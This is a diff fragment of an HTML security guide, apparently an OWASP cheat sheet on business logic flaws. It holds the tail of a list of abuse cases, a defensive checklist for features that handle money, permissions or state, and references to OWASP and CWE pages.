+<li>Stacking promos that were meant to be mutually exclusive.</li>
+<li>Abusing "refer a friend" mechanics to send spam that looks like it comes from your platform.</li>
+</ul>
+<h2 id="summary-checklist">Summary Checklist<a class="headerlink" href="#summary-checklist" title="Permanent link">&para;</a></h2>
+<p>Before shipping any feature that handles money, permissions, or state, walkthrough this list:</p>
+<ul>
+<li>Are all security-relevant values (prices, permissions, identity, ownership) derived server-side, not accepted from the client?</li>
+<li>Is every multi-step workflow represented as an explicit state machine in server-side storage, with each transition validated?</li>
+<li>Is every check-then-act operation atomic (transaction, row lock, or conditional update)?</li>
+<li>Do external non-idempotent calls accept an idempotency key?</li>
+<li>Does every value-dispensing feature have a per-action cap, a per-account cap, and a rate limit?</li>
+<li>Are all invariants written down and tested?</li>
+<li>Is every entry point for a sensitive operation subject to the same business rules?</li>
+<li>Does logging capture enough context to reconstruct abuse after the fact, and do alerts fire on anomalous rates?</li>
+<li>Have you considered the dishonest-user perspective, not just the attacker-with-exploit perspective?</li>
+</ul>
+<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/10-Business_Logic_Testing/">OWASP Web Security Testing Guide - Business Logic Testing</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/840.html">CWE-840: Business Logic Errors</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/841.html">CWE-841: Improper Enforcement of Behavioral Workflow</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/367.html">CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition</a></li>
+<li><a href="Authorization_Cheat_Sheet.html">OWASP Authorization Cheat Sheet</a></li>
+<li><a href="Access_Control_Cheat_Sheet.html">OWASP Access Control Cheat Sheet</a></li>
+<li><a href="Transaction_Authorization_Cheat_Sheet.html">OWASP Transaction Authorization Cheat Sheet</a></li>
+<li><a href="Input_Validation_Cheat_Sheet.html">OWASP Input Validation Cheat Sheet</a></li>
+<li><a href="Abuse_Case_Cheat_Sheet.html">OWASP Abuse Case Cheat Sheet</a></li>
+</ul>
 
 
 
